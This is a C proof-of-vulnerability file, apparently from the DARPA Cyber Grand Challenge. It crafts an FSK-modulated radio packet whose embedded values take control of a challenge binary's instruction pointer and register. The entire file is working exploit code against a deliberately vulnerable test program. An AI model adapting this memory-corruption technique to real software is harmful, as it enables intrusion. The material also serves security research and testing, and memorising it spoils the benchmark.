/*

Author: Jason Williams <jdw@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libpov.h>

#define SAMPLE_FS       (9600)
#define PI_VALUE        (3.1415926535897)

#define SAMPLE_SEND_MAX  (SAMPLE_FS * 4)

uint16_t simple_checksum16( uint8_t *pData, uint16_t dataLen )
{
	uint16_t checksum = 0xbfad;

	while ( dataLen-- > 0 )
	{
		checksum += *pData++;
	}

	return checksum;
}

void send_pov_packet( void )
{
	uint8_t firFilterInit[256];
	
	uint8_t *packet_data = NULL;
	uint32_t packet_data_length = 0;

	uint8_t init_data[128];
	uint32_t init_data_len = 49;

	uint8_t packet_header_data[8];
	uint32_t packet_header_length = 8;

	uint8_t *send_data = NULL;
	uint32_t send_length = 0;

	uint16_t checksum_value;
	uint8_t checksum_buffer[2];
	uint32_t checksum_buffer_length = 2;

	uint8_t emptySpace[4];
	uint32_t emptySpaceLen = 4;

	uint32_t samples_sent = 0;
	uint32_t i;

	memset( emptySpace, 0, 4 );

	// Preamble 1010 1010 1010 1010 1010...
	packet_header_data[0] = 0xAA;
	packet_header_data[1] = 0xAA;
	packet_header_data[2] = 0xAA;
	packet_header_data[3] = 0xAA;
	packet_header_data[4] = 0xAA;

	// Sync word
	packet_header_data[5] = 0xCF;
	packet_header_data[6] = 0xA3;
	
	// Length	
	packet_header_data[7] = init_data_len + 12;

	memset( init_data, 0xAA, 49 );
	init_data[0] = 3;
	init_data[4] = 0xAA;

	packet_data = append_buf( packet_data, &packet_data_length, init_data, init_data_len );
	packet_data = append_var( "TYPE1_REG", packet_data, &packet_data_length );
	packet_data = append_buf( packet_data, &packet_data_length, emptySpace, 4 );	
	packet_data = append_var( "TYPE1_IP", packet_data, &packet_data_length );

	// Calcluate checksum
	checksum_value = simple_checksum16( packet_data, packet_data_length );
	checksum_buffer[0] = (checksum_value >> 8) & 0xFF;
	checksum_buffer[1] = (checksum_value & 0xFF);

	// New packet
	send_data = append_buf( send_data, &send_length, packet_header_data, packet_header_length );
	send_data = append_buf( send_data, &send_length, packet_data, packet_data_length );
	send_data = append_buf( send_data, &send_length, checksum_buffer, checksum_buffer_length );	
	
	// Free the packet data
	free( packet_data );

	// Send 256-bytes of NULL to seed FIR filter
	memset( firFilterInit, 0, 256 );

	for ( uint32_t t = 0; t < 2; t++ )
	{
	// Send initial samples
	transmit_all( 1, firFilterInit, 256 );
	samples_sent += 256;

	for ( i = 0; i < send_length; i++ )
	{
		uint8_t cur_bit = 0;
		for ( cur_bit = 0; cur_bit < 8; cur_bit++ )
		{
			uint8_t sample_count = 0;
			uint8_t send_bit = (send_data[i] >> (7-cur_bit)) & 0x1;

			for ( sample_count = 0; sample_count < 32; sample_count++ )
			{
				double new_sample;
				double amplitude = 80.0;

				if ( send_bit == 0 )
					new_sample = amplitude * cos( 2 * PI_VALUE * 1200.0 * ((double)sample_count / (double)SAMPLE_FS) );
				else
					new_sample = amplitude * cos( 2 * PI_VALUE * 2400.0 * ((double)sample_count / (double)SAMPLE_FS) );
			
				samples_sent++;

				// Send sample!
				int8_t out_sample = (int8_t)new_sample;

				transmit_all( 1, &out_sample, 1 );	
			}	
		}
	}

	}

	// Free the send data
	free( send_data );

	for ( ; samples_sent < SAMPLE_SEND_MAX; samples_sent++ )
	{
		uint8_t out_sample = 0;

		transmit_all( 1, &out_sample, 1 );
	}

}

int main(void) 
{
	// ipmask -- mask of CB/RB instruction pointer
	// regmask -- mask of CB/RB register (specified by third argument)
	// 0 - eax, 1 - ecx, 2 - edx, 3 - ebx, 4 - esp, 5 - ebp, 6 - esi, 7 - edi
   	negotiate_type1(0xfefefefe, 0xfefefefe, 6);

	// Build packet to send
	send_pov_packet();

	for ( uint32_t read_count = 0; read_count < 4; read_count++ )	
	{
		unsigned char *read_00000;
		unsigned int read_00000_len;
		unsigned int read_00000_ptr = 0;
		//**** delimited read
		static unsigned char read_00000_delim[] = 
		 "\x0a";
		read_00000 = NULL;
		read_00000_len = 0;
		int read_00000_res = delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
		free(read_00000);

	}
}
